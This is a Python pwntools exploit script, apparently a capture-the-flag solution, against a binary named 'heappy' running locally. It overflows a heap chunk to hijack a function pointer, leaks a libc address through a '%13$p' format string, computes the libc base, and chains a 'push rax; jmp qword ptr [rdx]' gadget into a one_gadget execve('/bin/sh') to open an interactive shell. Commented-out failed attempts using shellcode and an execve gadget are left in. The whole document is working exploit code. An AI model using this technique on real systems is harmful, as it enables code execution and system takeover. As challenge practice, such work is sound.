from pwn import *


def recv_n_lines(r, n):
    for _ in range(n):
        r.recvline()


def main():
    local = True
    elf = ELF("./heappy")
    libc = ELF("./libc-2.19.so")
    context.binary = elf
    if local:
        r = process(["./heappy"])
    else:
        r = remote("127.0.0.1", 5000)
    padding = 144
    """
    shellcode = b"\x90" * 10 + asm(shellcraft.sh())
    jmp_rdx = 0x00000000004006f7
    payload = shellcode + b"A" * (padding - len(shellcode)) + p64(jmp_rdx)
    """
    target = elf.symbols['printf'] # for leakage
    payload = b'A' * padding + p64(target)
    recv_n_lines(r, 4)
    # choose language
    r.sendline("1")
    recv_n_lines(r, 2)
    # choose name
    r.sendline("pwn")
    recv_n_lines(r, 5)
    # change language -> allocate new chunk
    r.sendline("2")
    recv_n_lines(r, 4)
    # ita language
    r.sendline("2")
    recv_n_lines(r, 5)
    # change name
    r.sendline("1")
    recv_n_lines(r, 2)
    # overflow in functions' chunk
    r.sendline(payload)
    # r.interactive()
    r.recvuntil('nome?')
    r.sendline('%13$p')
    r.recvuntil('nome?')
    r.sendline('pwn')
    r.recvline()
    leak = r.recvline()
    leak = bytes.fromhex(leak.split(b'0x')[1][:12].decode())[::-1]
    leak = u64(leak + b'\x00' * 2)
    libc.address = leak - 234 - libc.symbols["__libc_start_main"]
    """
    # found using https://github.com/david942j/one_gadget on libc-2.19.so
    # constraint: [rsp+0x70] == NULL
    one_gadget_rce = libc.address + 0xea36d
    payload = b'A' * padding + p64(one_gadget_rce)
    
    # but the constraints were limiting... need JOP
    # the best search so far, trying to do stack pivoting:
    # $ ROPgadget --binary libc-2.19.so | grep "rdx" | grep "jmp qword" | grep "push rd"
    """
    
    # since rdi points to our buffer, another good search is:
    # $ ROPgadget --binary libc-2.19.so | grep "syscall" | grep "0x3b"
    # which gives 0xc5125 as sys_execve gadget; the problem is the filename, which contains padding
    # we could try by adding $IFS
    """
    sys_execve_gadget = libc.address + 0xc5125
    filename = b"/bin/sh" + b"$IFS"
    payload = filename + b"A" * (padding - len(filename)) + p64(sys_execve_gadget)
    # still doesn't work
    """
    # $ ROPgadget --binary libc-2.19.so | grep "push" | grep "jmp qword" | grep "rd"
    # the idea: if the constraint on the stack of a one-gadget RCE is not satisfied,
    # we make another try by moving RSP a little bit
    # 0x1a5371 : push rax ; mov esi, ecx ; jmp qword ptr [rdx]
    push_jump_qword_ptr_rdx_gadget = p64(libc.address + 0x1a5371)
    """
    0x4647c execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL

    0xe9415 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL

    0xea36d execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL

    """
    one_gadget_rce = p64(libc.address + 0xe9415)
    payload = one_gadget_rce + b"A" * (padding - len(one_gadget_rce)) + push_jump_qword_ptr_rdx_gadget
    # _go = input()     # for stopping the program and attach gdb
    r.recvuntil('?')
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()

    

 
